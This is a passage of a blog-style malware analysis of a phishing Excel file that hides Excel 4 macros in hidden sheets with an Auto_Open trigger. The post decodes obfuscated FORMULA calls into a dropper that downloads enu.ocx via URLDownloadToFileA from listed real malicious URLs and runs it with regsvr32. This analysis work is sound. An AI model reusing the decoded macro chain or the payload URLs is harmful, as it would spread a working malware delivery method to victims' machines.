	<span class="token operator">&lt;</span>pageMargins <span class="token assign-left variable">left</span><span class="token operator">=</span><span class="token string">&quot;0.7&quot;</span> <span class="token assign-left variable">right</span><span class="token operator">=</span><span class="token string">&quot;0.7&quot;</span> <span class="token assign-left variable">top</span><span class="token operator">=</span><span class="token string">&quot;0.75&quot;</span> <span class="token assign-left variable">bottom</span><span class="token operator">=</span><span class="token string">&quot;0.75&quot;</span> <span class="token assign-left variable">header</span><span class="token operator">=</span><span class="token string">&quot;0.3&quot;</span> <span class="token assign-left variable">footer</span><span class="token operator">=</span><span class="token string">&quot;0.3&quot;</span> /<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>pageSetup <span class="token assign-left variable">orientation</span><span class="token operator">=</span><span class="token string">&quot;portrait&quot;</span> /<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/worksheet<span class="token operator">&gt;</span>   
</code></pre></div><p>We can see the function <code>FORMULA</code> which is Excel 4 macro functions. It was included in Excel 4, but when Excel 5 came out (in 1993!) this type of macros was replaced with VBA. Still though, in 2022, Microsoft Excel supports Excel 4 macros for backwards compatibility reasons. And recently, phishers have been using this old-school type of macro for malware.</p> <p>So we have confirmed the excel file indeed contains the malware.</p> <h2 id="digging-into-the-malware">Digging into the malware</h2> <p>As it is using the macro 4, I quickly opened the <a href="https://d13ot9o61jdzpp.cloudfront.net/files/Excel%204.0%20Macro%20Functions%20Reference.pdf" target="_blank" rel="noopener noreferrer">macro 4 function references<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> and checked the <code>FORMULA</code> function.</p> <ul><li>The FORMULA function takes two arguments, formula_text and reference. It takes the value in formula_text and places it in the spreadsheet at the location defined by reference.</li></ul> <p>But the text in FORMULA seemes unreadable (they have done this to protect from antivirus and encrypt the function calls).</p> <p>Lets make the macro function abit readbale. For this I chanded the <code>&amp;amp;</code> with the newline.</p> <div class="language-text extra-class"><pre class="language-text"><code>FORMULA('Je1'!D17,'Je2'!E6)=FORMULA(Vfrbuk1!P22
Vfrbuk1!H9
Vfrbuk1!L2
Vfrbuk1!B15
Vfrbuk1!B15
Lefasbor1!E4
Lefasbor1!B8
Lefasbor1!D12
'Je2'!E6
Lefasbor1!G9
Lefasbor1!K2
Lefasbor1!G18
Lefasbor1!R10
Lefasbor1!P5,D10)
(....) (redacted to save space)
</code></pre></div><p>But still there are some random texts like <code>Vfrbuk1</code> and <code>Lefasbor1</code> which we don't know what it is.</p> <p>In Excel we can reference a data field using the syntax like this <code>SheetName!ColumnRows</code> , and the format <code>Vfrbuk1!H9</code> matches the format. So it looks liks <code>Vfrbuk1</code> and <code>Lefasbor1</code> represents some sheet in excel. We can check the name of sheets in excel from <code>xl/workbook.xml</code></p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">cat</span> xl/workbook.xml

<span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">&quot;1.0&quot;</span> <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">&quot;UTF-8&quot;</span> <span class="token assign-left variable">standalone</span><span class="token operator">=</span><span class="token string">&quot;yes&quot;</span>?<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>workbook
	<span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">&quot;http://schemas.openxmlformats.org/spreadsheetml/2006/main&quot;</span>
	xmlns:r<span class="token operator">=</span><span class="token string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships&quot;</span> mc:Ignorable<span class="token operator">=</span><span class="token string">&quot;x15 xr xr6 xr10 xr2&quot;</span>
	xmlns:mc<span class="token operator">=</span><span class="token string">&quot;http://schemas.openxmlformats.org/markup-compatibility/2006&quot;</span>
	xmlns:x15<span class="token operator">=</span><span class="token string">&quot;http://schemas.microsoft.com/office/spreadsheetml/2010/11/main&quot;</span>
	xmlns:xr<span class="token operator">=</span><span class="token string">&quot;http://schemas.microsoft.com/office/spreadsheetml/2014/revision&quot;</span>
	xmlns:xr10<span class="token operator">=</span><span class="token string">&quot;http://schemas.microsoft.com/office/spreadsheetml/2016/revision10&quot;</span>
	xmlns:xr2<span class="token operator">=</span><span class="token string">&quot;http://schemas.microsoft.com/office/spreadsheetml/2015/revision2&quot;</span>
	xmlns:xr6<span class="token operator">=</span><span class="token string">&quot;http://schemas.microsoft.com/office/spreadsheetml/2016/revision6&quot;</span><span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>fileVersion <span class="token assign-left variable">appName</span><span class="token operator">=</span><span class="token string">&quot;xl&quot;</span> <span class="token assign-left variable">lastEdited</span><span class="token operator">=</span><span class="token string">&quot;7&quot;</span> <span class="token assign-left variable">lowestEdited</span><span class="token operator">=</span><span class="token string">&quot;7&quot;</span> <span class="token assign-left variable">rupBuild</span><span class="token operator">=</span><span class="token string">&quot;22527&quot;</span> /<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>workbookPr /<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>mc:AlternateContent
		xmlns:mc<span class="token operator">=</span><span class="token string">&quot;http://schemas.openxmlformats.org/markup-compatibility/2006&quot;</span><span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>mc:Choice <span class="token assign-left variable">Requires</span><span class="token operator">=</span><span class="token string">&quot;x15&quot;</span><span class="token operator">&gt;</span>
			<span class="token operator">&lt;</span>x15ac:absPath <span class="token assign-left variable">url</span><span class="token operator">=</span><span class="token string">&quot;C:\Users\Admin\Desktop\File<span class="token entity" title="\1">\1</span>mar\CIR-ZV<span class="token entity" title="\&quot;">\&quot;</span>
				xmlns:x15ac=&quot;</span>http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac<span class="token string">&quot; /&gt;
			&lt;/mc:Choice&gt;
		&lt;/mc:AlternateContent&gt;
		&lt;bookViews&gt;
			&lt;workbookView xWindow=&quot;</span>-120<span class="token string">&quot; yWindow=&quot;</span>-120<span class="token string">&quot; windowWidth=&quot;</span><span class="token number">20730</span><span class="token string">&quot; windowHeight=&quot;</span><span class="token number">11160</span><span class="token string">&quot; firstSheet=&quot;</span><span class="token number">1</span><span class="token string">&quot; activeTab=&quot;</span><span class="token number">1</span><span class="token string">&quot; /&gt;
		&lt;/bookViews&gt;
		&lt;sheets&gt;
			&lt;sheet name=&quot;</span>Vfrbuk1<span class="token string">&quot; sheetId=&quot;</span><span class="token number">2</span><span class="token string">&quot; state=&quot;</span>hidden<span class="token string">&quot; r:id=&quot;</span>rId3<span class="token string">&quot; /&gt;
			&lt;sheet name=&quot;</span>Sheet<span class="token string">&quot; sheetId=&quot;</span><span class="token number">8</span><span class="token string">&quot; r:id=&quot;</span>rId4<span class="token string">&quot; /&gt;
			&lt;sheet name=&quot;</span>Lefasbor1<span class="token string">&quot; sheetId=&quot;</span><span class="token number">3</span><span class="token string">&quot; state=&quot;</span>hidden<span class="token string">&quot; r:id=&quot;</span>rId5<span class="token string">&quot; /&gt;
			&lt;sheet name=&quot;</span>EFALGV<span class="token string">&quot; sheetId=&quot;</span><span class="token number">4</span><span class="token string">&quot; state=&quot;</span>hidden<span class="token string">&quot; r:id=&quot;</span>rId6<span class="token string">&quot; /&gt;
			&lt;sheet name=&quot;</span>Je1<span class="token string">&quot; sheetId=&quot;</span><span class="token number">5</span><span class="token string">&quot; state=&quot;</span>hidden<span class="token string">&quot; r:id=&quot;</span>rId7<span class="token string">&quot; /&gt;
			&lt;sheet name=&quot;</span>Je2<span class="token string">&quot; sheetId=&quot;</span><span class="token number">6</span><span class="token string">&quot; state=&quot;</span>hidden<span class="token string">&quot; r:id=&quot;</span>rId8<span class="token string">&quot; /&gt;
		&lt;/sheets&gt;
		&lt;definedNames&gt;
			&lt;definedName name=&quot;</span>DDDDD1<span class="token string">&quot;&gt;#REF!&lt;/definedName&gt;
			&lt;definedName name=&quot;</span>DDWD<span class="token string">&quot;&gt;#REF!&lt;/definedName&gt;
			&lt;definedName name=&quot;</span>DDWD1<span class="token string">&quot;&gt;#REF!&lt;/definedName&gt;
			&lt;definedName name=&quot;</span>DDWD2<span class="token string">&quot;&gt;#REF!&lt;/definedName&gt;
			&lt;definedName name=&quot;</span>DDWD3<span class="token string">&quot;&gt;#REF!&lt;/definedName&gt;
			&lt;definedName name=&quot;</span>DDWD4<span class="token string">&quot;&gt;#REF!&lt;/definedName&gt;
			&lt;definedName name=&quot;</span>GFGH1<span class="token string">&quot;&gt;EFALGV!<span class="token variable">$D</span><span class="token variable">$10</span>&lt;/definedName&gt;
			&lt;definedName name=&quot;</span>GFGH2<span class="token string">&quot;&gt;EFALGV!<span class="token variable">$D</span><span class="token variable">$12</span>&lt;/definedName&gt;
			&lt;definedName name=&quot;</span>GFGH3<span class="token string">&quot;&gt;EFALGV!<span class="token variable">$D</span><span class="token variable">$14</span>&lt;/definedName&gt;
			&lt;definedName name=&quot;</span>GFGH4<span class="token string">&quot;&gt;EFALGV!<span class="token variable">$D</span><span class="token variable">$16</span>&lt;/definedName&gt;
			&lt;definedName name=&quot;</span>GFGH5<span class="token string">&quot;&gt;EFALGV!<span class="token variable">$D</span><span class="token variable">$18</span>&lt;/definedName&gt;
			&lt;definedName name=&quot;</span>GFGH6<span class="token string">&quot;&gt;EFALGV!<span class="token variable">$D</span><span class="token variable">$20</span>&lt;/definedName&gt;
			&lt;definedName name=&quot;</span>KKLD8<span class="token string">&quot;&gt;#REF!&lt;/definedName&gt;
			&lt;definedName name=&quot;</span>Auto_Open<span class="token string">&quot;&gt;EFALGV!<span class="token variable">$D</span><span class="token variable">$1</span>&lt;/definedName&gt;
		&lt;/definedNames&gt;
		&lt;calcPr calcId=&quot;</span><span class="token number">191029</span><span class="token string">&quot; /&gt;
		&lt;extLst&gt;
			&lt;ext uri=&quot;</span><span class="token punctuation">{</span>B58B0392-4F1F-4190-BB64-5DF3571DCE5F<span class="token punctuation">}</span><span class="token string">&quot;
				xmlns:xcalcf=&quot;</span>http://schemas.microsoft.com/office/spreadsheetml/2018/calcfeatures<span class="token string">&quot;&gt;
				&lt;xcalcf:calcFeatures&gt;
					&lt;xcalcf:feature name=&quot;</span>microsoft.com:RD<span class="token string">&quot; /&gt;
					&lt;xcalcf:feature name=&quot;</span>microsoft.com:FV&quot; /<span class="token operator">&gt;</span>
				<span class="token operator">&lt;</span>/xcalcf:calcFeatures<span class="token operator">&gt;</span>
			<span class="token operator">&lt;</span>/ext<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>/extLst<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>/workbook<span class="token operator">&gt;</span>    
</code></pre></div><p>Indeed we were right <code>&lt;sheet name=&quot;Vfrbuk1&quot; sheetId=&quot;2&quot; state=&quot;hidden&quot; r:id=&quot;rId3&quot; /&gt;</code>, the string <code>Vfrbuk1</code> represent the sheet 2. We can see this sheet in <code>xl/worksheets</code></p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token punctuation">[</span>/tmp/ok/test/xl/worksheets<span class="token punctuation">]</span>
└─$ <span class="token function">ls</span> -la
total <span class="token number">36</span>
drwxr-xr-x <span class="token number">3</span> parallels parallels <span class="token number">4096</span> Mar  <span class="token number">4</span> <span class="token number">15</span>:46 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">9</span> parallels parallels <span class="token number">4096</span> Mar  <span class="token number">4</span> <span class="token number">15</span>:46 <span class="token punctuation">..</span>
drwxr-xr-x <span class="token number">2</span> parallels parallels <span class="token number">4096</span> Mar  <span class="token number">4</span> <span class="token number">15</span>:46 _rels
-rw-r--r-- <span class="token number">1</span> parallels parallels <span class="token number">5229</span> Jan  <span class="token number">1</span>  <span class="token number">1980</span> sheet1.xml
-rw-r--r-- <span class="token number">1</span> parallels parallels <span class="token number">1363</span> Jan  <span class="token number">1</span>  <span class="token number">1980</span> sheet2.xml
-rw-r--r-- <span class="token number">1</span> parallels parallels <span class="token number">3907</span> Jan  <span class="token number">1</span>  <span class="token number">1980</span> sheet3.xml
-rw-r--r-- <span class="token number">1</span> parallels parallels <span class="token number">1470</span> Jan  <span class="token number">1</span>  <span class="token number">1980</span> sheet4.xml
-rw-r--r-- <span class="token number">1</span> parallels parallels <span class="token number">1385</span> Jan  <span class="token number">1</span>  <span class="token number">1980</span> sheet5.xml
</code></pre></div><p>If we check the <code>sheet1.xml</code></p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">cat</span> sheet1.xml
<span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">&quot;.0&quot;</span> <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">&quot;UTF-8&quot;</span> <span class="token assign-left variable">standalone</span><span class="token operator">=</span><span class="token string">&quot;yes&quot;</span>?<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>worksheet
	<span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">&quot;http://schemas.openxmlformats.org/spreadsheetml/2006/main&quot;</span>
	xmlns:r<span class="token operator">=</span><span class="token string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships&quot;</span>
	xmlns:xdr<span class="token operator">=</span><span class="token string">&quot;http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing&quot;</span>
	xmlns:x14<span class="token operator">=</span><span class="token string">&quot;http://schemas.microsoft.com/office/spreadsheetml/2009/9/main&quot;</span>
	xmlns:mc<span class="token operator">=</span><span class="token string">&quot;http://schemas.openxmlformats.org/markup-compatibility/2006&quot;</span> mc:Ignorable<span class="token operator">=</span><span class="token string">&quot;x14ac xr xr2 xr3&quot;</span>
	xmlns:x14ac<span class="token operator">=</span><span class="token string">&quot;http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac&quot;</span>
	xmlns:xm<span class="token operator">=</span><span class="token string">&quot;http://schemas.microsoft.com/office/excel/2006/main&quot;</span>
	xmlns:xr<span class="token operator">=</span><span class="token string">&quot;http://schemas.microsoft.com/office/spreadsheetml/2014/revision&quot;</span>
	xmlns:xr2<span class="token operator">=</span><span class="token string">&quot;http://schemas.microsoft.com/office/spreadsheetml/2015/revision2&quot;</span>
	xmlns:xr3<span class="token operator">=</span><span class="token string">&quot;http://schemas.microsoft.com/office/spreadsheetml/2016/revision3&quot;</span> xr:uid<span class="token operator">=</span><span class="token string">&quot;{00000000-0001-0000-0100-000000000000}&quot;</span><span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>dimension <span class="token assign-left variable">ref</span><span class="token operator">=</span><span class="token string">&quot;A2:Q37&quot;</span> /<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>sheetViews<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>sheetView <span class="token assign-left variable">workbookViewId</span><span class="token operator">=</span><span class="token string">&quot;0&quot;</span> <span class="token assign-left variable">topLeftCell</span><span class="token operator">=</span><span class="token string">&quot;A1&quot;</span> /<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>/sheetViews<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>sheetFormatPr <span class="token assign-left variable">defaultRowHeight</span><span class="token operator">=</span><span class="token string">&quot;15&quot;</span> /<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>cols<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>col <span class="token assign-left variable">min</span><span class="token operator">=</span><span class="token string">&quot;1&quot;</span> <span class="token assign-left variable">max</span><span class="token operator">=</span><span class="token string">&quot;16384&quot;</span> <span class="token assign-left variable">width</span><span class="token operator">=</span><span class="token string">&quot;9.142857142857142&quot;</span> <span class="token assign-left variable">style</span><span class="token operator">=</span><span class="token string">&quot;1&quot;</span> /<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>/cols<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>sheetData<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>row <span class="token assign-left variable">r</span><span class="token operator">=</span><span class="token string">&quot;2&quot;</span> <span class="token assign-left variable">spans</span><span class="token operator">=</span><span class="token string">&quot;5:12&quot;</span> <span class="token assign-left variable">ht</span><span class="token operator">=</span><span class="token string">&quot;15&quot;</span><span class="token operator">&gt;</span>
			<span class="token operator">&lt;</span>c <span class="token assign-left variable">r</span><span class="token operator">=</span><span class="token string">&quot;E2&quot;</span> <span class="token assign-left variable">s</span><span class="token operator">=</span><span class="token string">&quot;1&quot;</span> <span class="token assign-left variable">t</span><span class="token operator">=</span><span class="token string">&quot;str&quot;</span><span class="token operator">&gt;</span>
				<span class="token operator">&lt;</span>f<span class="token operator">&gt;</span>CHAR<span class="token punctuation">(</span><span class="token number">113</span>-2<span class="token punctuation">)</span><span class="token operator">&lt;</span>/f<span class="token operator">&gt;</span>
				<span class="token operator">&lt;</span>v<span class="token operator">&gt;</span>o<span class="token operator">&lt;</span>/v<span class="token operator">&gt;</span>
			<span class="token operator">&lt;</span>/c<span class="token operator">&gt;</span>
			<span class="token operator">&lt;</span>c <span class="token assign-left variable">r</span><span class="token operator">=</span><span class="token string">&quot;G2&quot;</span> <span class="token assign-left variable">s</span><span class="token operator">=</span><span class="token string">&quot;1&quot;</span> <span class="token assign-left variable">t</span><span class="token operator">=</span><span class="token string">&quot;str&quot;</span><span class="token operator">&gt;</span>
				<span class="token operator">&lt;</span>f<span class="token operator">&gt;</span>CHAR<span class="token punctuation">(</span><span class="token number">111</span>-6<span class="token punctuation">)</span><span class="token operator">&lt;</span>/f<span class="token operator">&gt;</span>
				<span class="token operator">&lt;</span>v<span class="token operator">&gt;</span>i<span class="token operator">&lt;</span>/v<span class="token operator">&gt;</span>
			<span class="token operator">&lt;</span>/c<span class="token operator">&gt;</span>
			<span class="token operator">&lt;</span>c <span class="token assign-left variable">r</span><span class="token operator">=</span><span class="token string">&quot;L2&quot;</span> <span class="token assign-left variable">s</span><span class="token operator">=</span><span class="token string">&quot;1&quot;</span> <span class="token assign-left variable">t</span><span class="token operator">=</span><span class="token string">&quot;str&quot;</span><span class="token operator">&gt;</span>
				<span class="token operator">&lt;</span>f<span class="token operator">&gt;</span>CHAR<span class="token punctuation">(</span><span class="token number">71</span>-6<span class="token punctuation">)</span><span class="token operator">&lt;</span>/f<span class="token operator">&gt;</span>
				<span class="token operator">&lt;</span>v<span class="token operator">&gt;</span>A<span class="token operator">&lt;</span>/v<span class="token operator">&gt;</span>
			<span class="token operator">&lt;</span>/c<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>/row<span class="token operator">&gt;</span>
    <span class="token punctuation">(</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>redacted to save space<span class="token punctuation">]</span>
		<span class="token operator">&lt;</span>row <span class="token assign-left variable">r</span><span class="token operator">=</span><span class="token string">&quot;37&quot;</span> <span class="token assign-left variable">spans</span><span class="token operator">=</span><span class="token string">&quot;11:11&quot;</span> <span class="token assign-left variable">ht</span><span class="token operator">=</span><span class="token string">&quot;15&quot;</span><span class="token operator">&gt;</span>
			<span class="token operator">&lt;</span>c <span class="token assign-left variable">r</span><span class="token operator">=</span><span class="token string">&quot;K37&quot;</span> <span class="token assign-left variable">s</span><span class="token operator">=</span><span class="token string">&quot;1&quot;</span><span class="token operator">&gt;</span>
				<span class="token operator">&lt;</span>f<span class="token operator">&gt;</span>_xlfn.ARABIC<span class="token punctuation">(</span><span class="token string">&quot;CI&quot;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/f<span class="token operator">&gt;</span>
				<span class="token operator">&lt;</span>v<span class="token operator">&gt;</span><span class="token number">10</span><span class="token operator"><span class="token file-descriptor important">1</span>&lt;</span>/v<span class="token operator">&gt;</span>
			<span class="token operator">&lt;</span>/c<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>/row<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>/sheetData<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>pageMargins <span class="token assign-left variable">left</span><span class="token operator">=</span><span class="token string">&quot;0.7&quot;</span> <span class="token assign-left variable">right</span><span class="token operator">=</span><span class="token string">&quot;0.7&quot;</span> <span class="token assign-left variable">top</span><span class="token operator">=</span><span class="token string">&quot;0.75&quot;</span> <span class="token assign-left variable">bottom</span><span class="token operator">=</span><span class="token string">&quot;0.75&quot;</span> <span class="token assign-left variable">header</span><span class="token operator">=</span><span class="token string">&quot;0.3&quot;</span> <span class="token assign-left variable">footer</span><span class="token operator">=</span><span class="token string">&quot;0.3&quot;</span> /<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>pageSetup <span class="token assign-left variable">orientation</span><span class="token operator">=</span><span class="token string">&quot;portrait&quot;</span> <span class="token assign-left variable">paperSize</span><span class="token operator">=</span><span class="token string">&quot;9&quot;</span> r:id<span class="token operator">=</span><span class="token string">&quot;rId1&quot;</span> /<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/worksheet<span class="token operator">&gt;</span>
</code></pre></div><p>In the xml file the only important thing for us is <code>&lt;c r=&quot;E2&quot; s=&quot;1&quot; t=&quot;str&quot;&gt;</code> and <code>&lt;v&gt;o&lt;/v&gt;</code>.
Because. the encrypted text in macro formula function i.e <code>Vfrbuk1!E2</code> can be translated into 'o'.</p> <p>Like this we can decode all the encrypted macro function and this is what I get after decoing.
(There might me some problem with the decoded version because I am lazy to see and decode everything perfectly lol)</p> <div class="language- extra-class"><pre class="language-text"><code>=FORMULA(=CALL(&quot;urlmon&quot;,&quot;URLDownloadToFileA&quot;,&quot;JJCCBB&quot;,0,6,..\enu.ocx&quot;,0,0),D10)
=FORMULA(=IF(&quot;GFGH1&quot;&lt;0,=CALL(&quot;urlmon&quot;,&quot;URLDownloadToFileA&quot;,&quot;JJCCBB&quot;,0,7,..\enu.ocx&quot;,0,0),D12)
=FORMULA(=IF(&quot;GFGH2&quot;&lt;0,=CALL(&quot;urlmon&quot;,&quot;URLDownloadToFileA&quot;,&quot;JJCCBB&quot;,0,8,..\enu.ocx&quot;,0,0),D14)
=FORMULA(=IF(&quot;GFGH3&quot;&lt;0,=CALL(&quot;urlmon&quot;,&quot;URLDownloadToFileA&quot;,&quot;JJCCBB&quot;,0,9,..\enu.ocx&quot;,0,0),D16)
=FORMULA(=IF(&quot;GFGH4&quot;&lt;0,=CALL(&quot;urlmon&quot;,&quot;URLDownloadToFileA&quot;,&quot;JJCCBB&quot;,0,10,..\enu.ocx&quot;,0,0),D18)
=FORMULA(=IF(&quot;GFGH5&quot;&lt;0,=CALL(&quot;urlmon&quot;,&quot;URLDownloadToFileA&quot;,&quot;JJCCBB&quot;,0,11,..\enu.ocx&quot;,0,0),D20)
=FORMULA(=IF(&quot;GFGH6&quot;&lt;0,=CLOSE(0),),D22)
=FORMULA(=EXEC(&quot;C:435 2&lt;0, ..\enu.ocx&quot;),D24)
=FORMULA(=RETURN(),D33)
</code></pre></div><p>The macro download the file called enu.ocx from remote url and execute it silently. The number like 6,7,8,9,10,11 are the place holders for the remote urls. We can see those urls in <code>xl/sharedStrings.xml</code></p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">cat</span> xl/sharedStrings.xml
<span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">&quot;1.0&quot;</span> <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">&quot;UTF-8&quot;</span> <span class="token assign-left variable">standalone</span><span class="token operator">=</span><span class="token string">&quot;yes&quot;</span>?<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>sst
	<span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">&quot;http://schemas.openxmlformats.org/spreadsheetml/2006/main&quot;</span> <span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token string">&quot;13&quot;</span> <span class="token assign-left variable">uniqueCount</span><span class="token operator">=</span><span class="token string">&quot;13&quot;</span><span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>si<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>t<span class="token operator">&gt;</span>G<span class="token operator">&lt;</span>/t<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>/si<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>si<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>t<span class="token operator">&gt;</span><span class="token operator">!</span><span class="token operator">&lt;</span>/t<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>/si<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>si<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>t<span class="token operator">&gt;</span>/<span class="token operator">&lt;</span>/t<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>/si<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>si<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>t<span class="token operator">&gt;</span>SysWow64<span class="token punctuation">\</span><span class="token operator">&lt;</span>/t<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>/si<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>si<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>t<span class="token operator">&gt;</span><span class="token punctuation">\</span>Windows<span class="token punctuation">\</span><span class="token operator">&lt;</span>/t<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>/si<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>si<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>t<span class="token operator">&gt;</span>r<span class="token string">&quot;&amp;amp;&quot;</span>eg<span class="token string">&quot;&amp;amp;&quot;</span>sv<span class="token string">&quot;&amp;amp;&quot;</span>r32.exe<span class="token operator">&lt;</span>/t<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>/si<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>si<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>t<span class="token operator">&gt;</span><span class="token string">&quot;http://piajimenez.com/Fox-C/dS4nv3spYd0DZsnwLqov/&quot;</span>,<span class="token string">&quot;&lt;/t&gt;
	&lt;/si&gt;
	&lt;si&gt;
		&lt;t&gt;&quot;</span>http://inopra.com/wp-includes/3zGnQGNCvIKuvrO7T/<span class="token string">&quot;,&quot;</span><span class="token operator">&lt;</span>/t<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>/si<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>si<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>t<span class="token operator">&gt;</span><span class="token string">&quot;http://biomedicalpharmaegypt.com/sapbush/BKEaVq1zoyJssmUoe/&quot;</span>,<span class="token string">&quot;&lt;/t&gt;
	&lt;/si&gt;
	&lt;si&gt;
		&lt;t&gt;&quot;</span>https://getlivetext.com/Pectinacea/AL5FVpjleCW/<span class="token string">&quot;,&quot;</span><span class="token operator">&lt;</span>/t<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>/si<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>si<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>t<span class="token operator">&gt;</span><span class="token string">&quot;http://janshabd.com/Zgye2/&quot;</span>,<span class="token string">&quot;&lt;/t&gt;
	&lt;/si&gt;
	&lt;si&gt;
		&lt;t&gt;&quot;</span>https://justforanime.com/stratose/PonwPXCl/<span class="token string">&quot;,&quot;</span><span class="token operator">&lt;</span>/t<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>/si<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>si<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>t<span class="token operator">&gt;</span>e<span class="token operator">&lt;</span>/t<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>/si<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/sst<span class="token operator">&gt;</span> 
</code></pre></div><p>Here are all the urls the macro send request to download the enu.ocx file.</p> <p>If you google any of the url you can see the list of other website delivering the similar malware. <a href="https://urlhaus.abuse.ch/downloads/text_recent/" target="_blank" rel="noopener noreferrer">https://urlhaus.abuse.ch/downloads/text_recent/<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p></div> <footer class="page-edit"><!----> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/blog/Servsau.html" class="prev">Servsau</a></span> <!----></p></div> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.33d307ae.js" defer></script><script src="/assets/js/2.2a395b45.js" defer></script><script src="/assets/js/13.85778b46.js" defer></script>
  </body>
</html>
